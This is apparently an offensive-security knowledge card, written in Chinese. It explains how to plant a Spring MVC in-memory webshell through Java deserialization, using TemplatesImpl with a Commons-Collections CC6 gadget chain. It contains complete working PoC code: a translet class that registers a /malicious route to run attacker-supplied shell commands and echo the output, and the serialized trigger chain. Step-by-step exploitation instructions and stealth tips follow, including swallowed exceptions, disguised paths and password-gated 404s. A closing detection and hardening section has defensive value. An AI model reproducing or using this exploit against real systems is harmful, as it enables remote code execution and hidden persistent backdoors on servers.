---
id: web-java-framework-spring-mvc-memshell-translet-ctor-getmappingformethod
title: 反序列化 TemplatesImpl 落 Spring Controller 内存马：translet 构造器内用 getMappingForMethod 生成 RequestMappingInfo 再 registerMapping
type: scenario
domain: web
path: web/java/framework/spring
technique: translet-constructor-memshell-getmappingformethod-register
aliases:
- TemplatesImpl 直接落 Controller 内存马
- getMappingForMethod 构造 RequestMappingInfo
- AbstractTranslet 构造器注册路由
- SpringBoot 2.x 通用内存马
- CC6 打 Spring 内存马
tags:
- java
- spring
- spring-mvc
- memshell
- templatesimpl
- deserialization
- registermapping
- reflection
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:38:38+08:00'
  notes: 已对照原文核对；本次核对未读取图片；内存马类 extends AbstractTranslet 并在构造器内取 DispatcherServlet.CONTEXT、反射 getMappingForMethod(Method,Class) 生成 RequestMappingInfo 后 registerMapping、catch 静默吞异常、@RequestMapping 注册 /malicious 读 cmd 参数回显、CC6 触发段（ConstantTransformer(TemplatesImpl) + InvokerTransformer(newTransformer)、LazyMap 先挂 ConstantTransformer(1) 再 put 后 remove aaa 换 factory、_tfactory 用 TransformerFactoryImpl）均与正文代码一致；未验证点：卡内「getMappingForMethod 为 Spring 自身使用故天然跨版本」属原理推定，原文只写适用于 SpringMVC+Tomcat 与 SpringBoot 2.x、1.x 与 3.x 未测试；另正文「Commons-Collections 3.2.1 符合 CC6」与实际 pom 3.1 不一致，卡片按 pom 3.1 表述，未采纳该句为版本断言
---

## 一句话结论

把内存马类同时写成 `AbstractTranslet` 的子类：`TemplatesImpl` 加载字节码时会在构造器里执行，构造器先通过 `RequestContextHolder` 拿到 `DispatcherServlet.CONTEXT` 里的 `WebApplicationContext`，再反射调用 `RequestMappingHandlerMapping.getMappingForMethod(Method, Class)` 拿一个由 Spring 自己生成的 `RequestMappingInfo`（不用手搓私有构造器、不用管 `PathPatternsRequestCondition` 与 `PatternsRequestCondition` 的版本差异），最后 `registerMapping` 把自身方法注册成 `/malicious`，从而在反序列化后直接得到可交互的 `?cmd=` 回显马。

## 原理

- **为什么内存马类要继承 `AbstractTranslet`**：`TemplatesImpl.newTransformer()` → `getTransletInstance()` → `defineTransletClasses()` 会校验父类必须是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，否则抛 `ClassCastException`；同时它要实例化该类，于是**构造器就是执行点**（不一定非要静态块）。
- **为什么构造器里能拿到 Spring 上下文**：反序列化发生在 HTTP 请求线程内，`RequestContextHolder` 已被 `DispatcherServlet` 绑定，`currentRequestAttributes()` 返回 `ServletRequestAttributes`；其 `getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0)` 就是本次请求所在 `WebApplicationContext`，再 `getBean(RequestMappingHandlerMapping.class)` 拿到路由注册表。
- **为什么用 `getMappingForMethod` 而不是自己 new `RequestMappingInfo`**：`RequestMappingInfo` 的公共构造器只能生成旧式 `PatternsRequestCondition`，在 Spring 5.3+ 默认 `PathPatternParser` 下匹配会抛 `Expected lookupPath in request attribute "org.springframework.web.util.UrlPathHelper.PATH"`；私有十参构造器又依赖版本签名。`getMappingForMethod(Method, Class)` 是 Spring 自己在 `afterPropertiesSet` 里用的方法，会按**当前版本**的解析器配置正确生成 `RequestMappingInfo`，只需反射 `setAccessible(true)` 调用，天然跨 Spring 版本可用（本例作者自述适用于 SpringMVC+Tomcat 与 SpringBoot 2.x）。
- **为什么 handler 可以是自己 new 的实例**：`registerMapping(info, handler, method)` 并不要求 handler 被扫描到或带 `@Controller` 注解；传 `new SpringControllerMemShell3("aaa")`（用无参/带参构造器避开递归 new）即可，Spring 之后按 `HandlerMethod` 反射调用该实例的 `test` 方法。
- **为什么构造器要吞异常**：注册失败不应让 `TemplatesImpl` 实例化抛错，否则整条反序列化链在 `newTransformer` 处中断；用 `catch(Exception e){}` 静默兜底，让链"先落地再验证"。
- **回显为什么不用落文件**：注册出的 handler 直接读 `request.getParameter("cmd")`，按 `os.name` 选 `cmd.exe /c` 或 `/bin/sh -c`，`ProcessBuilder` 起进程后用 `Scanner(..., "\\A")` 读全量输出写回 `response.getWriter()`，请求-响应闭环，无需出网。

## 触发条件

- 存在 Java 原生反序列化入口（`ObjectInputStream#readObject` 处理可控 Base64），且类路径可用 `TemplatesImpl` 与 `AbstractTranslet`（JDK8 常见）。
- classpath 有 Spring MVC（`spring-webmvc` 在 Spring Boot 2.x 中默认存在），且请求线程上 `RequestContextHolder` 已绑定（反序列化发生在 DispatcherServlet 处理链内）。
- 有一条能加载 `TemplatesImpl` 字节码的 gadget（本例 CC6：`HashMap → TiedMapEntry → LazyMap → ChainedTransformer → ConstantTransformer(TemplatesImpl) + InvokerTransformer("newTransformer")`）。
- 目标 JDK 允许反射 `getMappingForMethod`（`setAccessible(true)` 在 JDK8 可用；JDK17 需先处理模块封装）。
- 注册路径未被全局安全过滤器/网关完全拦截。

## 利用步骤

1. 写内存马类：`extends AbstractTranslet`，实现两个 `transform` 空方法；构造器内完成上下文获取与路由注册；另写 `test()` 作为真正执行命令的 handler（读 `cmd` 参数、`ProcessBuilder` 执行、`Scanner` 读输出、写回 response）。
2. 编译成 `.class`（无包名或以固定全名引用），确认字节码版本不高于目标 JDK；用 javassist 或直接 `Files.readAllBytes` 取字节码。
3. 构造 `TemplatesImpl`：`_bytecodes = {code}`、`_name` 非空、`_tfactory = new TransformerFactoryImpl()`（`defineTransletClasses` 会用到，null 会 NPE）。
4. 装配 CC6 触发段：`ConstantTransformer(templates)` + `InvokerTransformer("newTransformer", null, null)` 组成 `ChainedTransformer`，挂到 `LazyMap` 的 `factory`，再包 `TiedMapEntry`，放进 `HashMap` 的 key。
5. 序列化前规避构造期自触发：`LazyMap` 先用无害 `ConstantTransformer(1)` 装饰，`put` 完 key 后 `lazyMap.remove("aaa")` 清缓存，再反射把 `factory` 换成真实 `ChainedTransformer`。
6. Base64 编码后发到 `/read?obj=...` 入口；`HashMap.readObject` 触发 `hashCode → getValue → LazyMap.get → transform → newTransformer → defineTransletClasses`，translet 构造器执行注册。
7. 访问 `/malicious?cmd=id` 验证；若 404，依次检查上下文属性名、`getMappingForMethod` 是否被拦、注册路径是否被网关拦截。
8. 若要更隐蔽，把路径改成静态资源样式或随机串，并在 handler 内校验口令，口令错时 `sendError(404)`。

## PoC

内存马类（构造器注册 + handler 回显，要点部分）：

```java
@Controller
public class SpringControllerMemShell3 extends AbstractTranslet {
    public SpringControllerMemShell3() {
        try {
            WebApplicationContext context = (WebApplicationContext)
                RequestContextHolder.currentRequestAttributes()
                    .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mapping =
                context.getBean(RequestMappingHandlerMapping.class);

            Method method = SpringControllerMemShell3.class.getMethod("test");
            Method getMappingForMethod = mapping.getClass()
                .getDeclaredMethod("getMappingForMethod", Method.class, Class.class);
            getMappingForMethod.setAccessible(true);                       // 关键：借 Spring 自己的构造逻辑
            RequestMappingInfo info = (RequestMappingInfo) getMappingForMethod.invoke(
                mapping, method, SpringControllerMemShell3.class);

            SpringControllerMemShell3 shell = new SpringControllerMemShell3("aaa"); // 避免递归 new 到注册逻辑
            mapping.registerMapping(info, shell, method);
        } catch (Exception e) { }                                          // 静默，别打断反序列化链
    }

    @Override public void transform(DOM d, SerializationHandler[] h) { }
    @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { }

    public SpringControllerMemShell3(String aaa) { }

    @RequestMapping("/malicious")
    public void test() throws IOException {
        HttpServletRequest req = ((ServletRequestAttributes)
            RequestContextHolder.currentRequestAttributes()).getRequest();
        HttpServletResponse resp = ((ServletRequestAttributes)
            RequestContextHolder.currentRequestAttributes()).getResponse();
        String cmd = req.getParameter("cmd");
        PrintWriter w = resp.getWriter();
        if (cmd == null) { resp.sendError(404); return; }
        boolean win = System.getProperty("os.name").toLowerCase().contains("win");
        ProcessBuilder p = win ? new ProcessBuilder("cmd.exe", "/c", cmd)
                               : new ProcessBuilder("/bin/sh", "-c", cmd);
        Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
        w.write(c.hasNext() ? c.next() : "");
        w.flush(); w.close();
    }
}
```

触发段（CC6 直连 `newTransformer`，注意 put 后替换 factory）：

```java
TemplatesImpl t = new TemplatesImpl();
setField(t, "_bytecodes", new byte[][]{ Files.readAllBytes(Paths.get("SpringControllerMemShell3.class")) });
setField(t, "_name", "Jay17");
setField(t, "_tfactory", new TransformerFactoryImpl());

Transformer[] ts = new Transformer[]{
    new ConstantTransformer(t),
    new InvokerTransformer("newTransformer", null, null)      // 直接调 newTransformer，无需 TrAXFilter
};
Map<Object,Object> lazy = LazyMap.decorate(new HashMap<>(), new ConstantTransformer(1));
TiedMapEntry entry = new TiedMapEntry(lazy, "aaa");
HashMap<Object,Object> outer = new HashMap<>();
outer.put(entry, "bbb");
lazy.remove("aaa");                                            // 清缓存，保证反序列化时再触发
setField(lazy, "factory", new ChainedTransformer(ts));         // 最后才换上真链
serialize(outer);                                              // Base64 后送 /read?obj=
```

## 变体与关联

- **变体一（不用 getMappingForMethod）**：反射 `RequestMappingInfo` 的私有十参构造器并传入 `PathPatternsRequestCondition`，或直接 `RequestMappingInfo.paths("/x").build()`（Spring 5.3+）；三条路各有版本/封装限制，`getMappingForMethod` 最省事但最容易被 RASP 关注。
- **变体二（执行点换位置）**：注册逻辑放静态块也能工作（`defineClass` 后不初始化则不执行，需 `newTransformer` 触发实例化才行）；放构造器的好处是"实例化即执行"，且能再次 `new` 出 handler 实例。
- **变体三（加载原语替换）**：把 `TemplatesImpl` 换成 Groovy `ClassLoader`、BCEL `ClassLoader`、`SignedObject` 二次反序列化等；构造器/静态块的取舍参见类加载原语选型卡。
- **变体四（Jackson 侧同一 sink）**：同一环境下也可用 Jackson `POJONode` + Spring AOP 动态代理触发 `TemplatesImpl.getOutputProperties`，与 CC6 触发段等价。
- **关联**：[[web-java-framework-spring-mvc-dynamic-controller-memshell]]（同一条 `registerMapping` 注册机制，但投递方式为 SpEL `ReflectUtils.defineClass`、`RequestMappingInfo` 用 `paths()` 构造；本条投递方式是反序列化 `TemplatesImpl` 且在 translet 构造器内完成注册，`RequestMappingInfo` 改用 `getMappingForMethod` 生成）、[[web-java-framework-spring-mvc-pathpattern-memshell]]（Spring 5.3+ 下旧 `PatternsRequestCondition` 匹配失败的成因与私有构造器方案）、[[web-java-deser-commonscollections-cc3-invokertransformer-newtransformer-variant]]（CC6 + `ConstantTransformer`/`InvokerTransformer("newTransformer")` 触发段的原理与构造期自触发陷阱）、[[web-java-classloader-deserialization-memshell-loader-selection]]（加载原语与"构造器 vs 静态块"的选型）。

## 检测与防御

- **检测**：JVM 中出现 `AbstractTranslet` 子类的未知类名被 `defineClass` 并实例化；`RequestMappingHandlerMapping` 的映射表在运行期新增路径（启动后基线比对）；运行期反射调用 `getMappingForMethod`；请求访问新增路径且带 `cmd` 参数。
- **检测**：反序列化流中出现 `TemplatesImpl` + `LazyMap`/`TiedMapEntry`/`InvokerTransformer` 组合；`TemplatesImpl._bytecodes` 被反射赋值。
- **加固**：对 `ObjectInputStream` 加 JEP 290 白名单过滤器，拒绝 `TemplatesImpl`、`InvokerTransformer`、`TiedMapEntry`、`LazyMap`；升级 commons-collections 到 3.2.2+（本例 3.1 直接可打）并移除不必要依赖。
- **加固**：对 `RequestMappingHandlerMapping#registerMapping` 与 `getMappingForMethod` 做 RASP 拦截/告警；生产环境启动后锁定路由注册表，禁止运行期新增映射。
- **响应**：重启进程清除；并结合 heap dump / Arthas 检查映射表中异常 handler 与动态定义的 translet 类。
